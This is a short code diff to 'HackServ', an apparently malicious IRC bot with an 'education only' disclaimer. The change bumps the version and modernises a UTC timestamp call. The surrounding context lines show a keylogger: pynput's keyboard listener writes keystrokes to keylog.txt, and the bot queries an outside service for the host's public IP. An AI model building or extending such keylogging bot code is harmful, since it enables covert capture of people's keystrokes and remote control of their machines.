@@ -27,8 +27,8 @@ legal_notice = 'THIS BOT IS FOR EDUCATION PURPOSES ONLY! DO NOT USE IT FOR MALIC
 author = 'Stephen Harris (trackmastersteve@gmail.com)'
 github = 'https://github.com/trackmastersteve/hackserv.git'
 software = 'HackServ'
-version = '1.3.6'
-last_modification = '2026.10.01'
+version = '1.3.7'
+last_modification = '2026.10.02'
 
 # Imports
 import os
@@ -53,7 +53,7 @@ import urllib.request
 from requests import get
 from pynput.keyboard import Key, Listener
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") # Text file to save keylogger data.
-starttime = datetime.datetime.utcnow() # Start time is used to calculate uptime.
+starttime = datetime.datetime.now(datetime.timezone.utc) # Start time is used to calculate uptime.
 ip = get('https://api.ipify.org').text # Get public IP address. (used to set botnick-to-ip as well as the '.ip' command.)
 sys.path.insert(0, '/usr/local/bin/') # Working directory.
 from hsConfig import * # import the hsConfig.py file.
